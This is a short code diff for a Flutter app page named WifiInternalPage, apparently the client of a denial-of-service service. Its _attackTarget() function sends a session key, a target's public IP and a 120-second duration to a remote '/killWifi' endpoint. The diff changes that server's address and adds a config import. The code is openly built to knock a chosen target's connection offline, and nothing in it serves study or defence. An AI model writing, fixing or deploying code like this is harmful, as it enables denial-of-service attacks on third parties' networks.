@@ -1,6 +1,7 @@
 import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
+import 'api_config.dart';
 
 class WifiInternalPage extends StatefulWidget {
   final String sessionKey;
@@ -68,7 +69,7 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
   Future<void> _attackTarget() async {
     setState(() => isAttacking = true);
     final url = Uri.parse(
-        "http://jeffantihama.rxpedia.biz.id:11647/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
+        "http://100memberprivet.surnxuesk.biz.id:10897/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
     try {
       final res = await http.get(url);
       if (res.statusCode == 200) {
